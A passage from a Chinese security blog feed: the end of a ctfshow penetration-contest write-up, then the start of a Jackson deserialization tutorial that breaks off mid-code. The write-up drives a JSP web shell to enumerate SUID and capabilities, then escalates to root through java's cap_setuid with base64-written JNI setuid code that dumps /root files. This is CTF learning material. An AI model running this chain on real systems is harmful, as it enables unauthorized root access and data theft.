class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113125116304.png" alt="image-20250113125116304"></p><p>执行成功，直接rce</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.7:8080/2.jsp?cmd<span class="token operator">=</span>ls%20/<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180516096.png" alt="image-20250113180516096"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180555193.png" alt="image-20250113180555193"></p><p>同样的方式读取dylan.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">The enemy cyber attacker 81192 has been injected with prions by our agents, and there is no chance of survival, victory is ours! The key is 7b11a7ae330883cb5bf667a9c1604635.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><hr><h2 id="今日方知我是我（复现）"><a href="#今日方知我是我（复现）" class="headerlink" title="今日方知我是我（复现）"></a>今日方知我是我（复现）</h2><p>需要提权为root</p><p>查suid</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">find%20/%20-perm%20-u<span class="token operator">=</span>s%20-type%20f%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chsh/usr/bin/chfn/usr/bin/passwd/bin/mount/bin/umount/bin/su/bin/ping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GTFObins 搜了下没有可用的命令</p><p>查cap权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap%20-r%20/%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/openjdk-8/bin/java <span class="token operator">=</span> cap_setuid+ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>java 设置了 cap_setuid 权限</p><p>那么需要用 java 执行<code>setuid(0)</code>的操作，然而java并不像python那样有专门的 os.setuid 可以设置</p><p>需要通过 JNI + setuid 实现，参考 <a href="https://stackoverflow.com/questions/5985597/jni-setuid-question">https://stackoverflow.com/questions/5985597/jni-setuid-question</a></p><p>这里按照官方wp的做法：</p><p>利用编码写入 SetUID.c:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>JNIEXPORT jint JNICALL <span class="token function">Java_SetUID_setUID</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jint uid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">setuid</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9"</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入 SetUID.java：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SetUID</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"SetUID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">setUID</span><span class="token punctuation">(</span><span class="token keyword">int</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SetUID</span> setUID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SetUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> result <span class="token operator">=</span> setUID<span class="token punctuation">.</span><span class="token function">setUID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Runtime</span><span class="token punctuation">.</span>getRuntime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat /root/*.txt>/opt/jetty/webapps/ROOT/root.txt"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ=="</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译 c 和 java 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c<span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>javac%20/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以root权限执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>java%20-Djava.library.path<span class="token operator">=</span>/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 &#x2F;root&#x2F;message.txt 的内容</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113183415373.png" alt="image-20250113183415373"></p><p>flag：<code>ctfshow&#123;http://8.11.9.2&#125;</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250114003547864.png" alt="image-20250114003547864"></p><p>End</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;马上就要期末考但还是来打了，给3-1困了好几天，还好最后没挂科（&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&quot;&gt;https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Jackson反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-12-24T03:44:13.000Z</published>
    <updated>2024-12-24T16:42:16.821Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学期初爽学一次Java，学期末再爽学一次Java😋</p><p>参考：</p><p><a href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8</a></p><p><a href="https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/</a></p><p><a href="https://zer0peach.github.io/2023/09/27/Jackson/">https://zer0peach.github.io/2023/09/27/Jackson/</a></p><span id="more"></span><hr><h1 id="Jackson基本使用"><a href="#Jackson基本使用" class="headerlink" title="Jackson基本使用"></a>Jackson基本使用</h1><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p><p>由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</p><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-annotations<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>定义一个 Person 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着编写 Jackson 的序列化与反序列化代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224121027834.png" alt="image-20241224121027834"></p><p>那么这里序列化的方法为<code>ObjectMapper.writeValueAsString</code>，反序列化的方法为<code>ObjectMapper.readValue</code></p><hr><h2 id="多态问题"><a href="#多态问题" class="headerlink" title="多态问题"></a>多态问题</h2><p>Java 多态指同一个接口使用不同的实例而执行不同的操作</p><p>那么对于反序列化来说就会有一个问题，对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例？</p><p>Jackson 实现了 <code>JacksonPolymorphicDeserialization</code> 机制来解决这个问题：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例</p><p>具体的操作：启用 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>在 ObjectMapper 中有详细介绍</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224123043497.png" alt="image-20241224123043497"></p><p>实际上四个选项是依次扩大作用范围的：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><blockquote><p>当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</p></blockquote><p>添加一个 Hacker 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hacker</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> skill <span class="token operator">=</span> <span class="token string">"havefun"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改 Person 类，添加 Object 类型属性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建 JAVA_LANG_OBJECTTest.java，添加 <code>enableDefaultTyping()</code> 并设置为 <code>JAVA_LANG_OBJECT</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JAVA_LANG_OBJECTTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置JAVA_LANG_OBJECT  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">JAVA_LANG_OBJECT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124150808.png" alt="image-20241224124150808"></p><p>无 DefaultTyping 的情况是：</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224124357516.png" alt="image-20241224124357516"></p><p>对比可以看出来，通过 enableDefaultTyping 设置 JAVA_LANG_OBJECT 后，会多输出 Hacker 类名，且在输出的 Object 属性时直接输出的是 Hacker 类对象</p><p>也就是说对 Object 对象进行了序列化和反序列化，并且明确规定类名</p><hr><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><blockquote><p>enableDefaultTyping  无参数时的默认选项。除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化。</p></blockquote><p>整一个 Sex 接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后实现它</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改 Person 类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token 